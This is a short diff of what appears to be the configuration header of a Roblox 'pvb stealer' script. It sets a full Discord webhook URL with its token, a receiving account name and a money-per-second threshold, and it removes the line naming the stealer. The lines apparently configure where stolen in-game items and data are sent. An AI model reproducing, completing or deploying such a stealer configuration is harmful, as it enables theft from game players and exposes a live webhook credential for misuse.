@@ -1,5 +1,3 @@
--- sayden pvb stealer v2 omg (may loading screen + auto rejoin na)
-
 WEBHOOK = "https://discord.com/api/webhooks/1428727369384071299/BZZwdfJwPFEI8hIMYBXyJfvjvIxStBNN97hscYzucV81k3qx2we5X_zyu21WNIkUYwgk"
 RECEIVERS = {"sattoshi2"}
 MONEY_PER_SECOND = 50000 -- DEFAULT: 300000
